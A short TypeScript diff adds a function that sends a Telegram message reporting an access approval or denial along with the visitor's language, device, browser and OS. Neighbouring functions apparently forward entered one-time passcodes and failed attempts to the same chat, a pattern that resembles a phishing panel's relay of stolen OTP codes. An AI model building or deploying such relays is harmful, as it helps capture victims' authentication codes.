@@ -69,6 +69,31 @@ export async function notifyOtpVerification(otp: string, language?: string, devi
   }
 }
 
+export async function notifyApproval(decision: string, language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
+  const isApproved = decision === "approved";
+  const emoji = isApproved ? "✅" : "❌";
+  const status = isApproved ? "Approved" : "Denied";
+  
+  const message = `
+<b>${emoji} Access ${status}</b>
+
+<b>Decision:</b> ${status}
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
+
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send approval notification:", error);
+    return false;
+  }
+}
+
 export async function notifyOtpFailure(otp: string, language?: string, device?: string, browser?: string, os?: string, attempt?: number): Promise<boolean> {
   const message = `
 <b>❌ OTP Verification Failed</b>
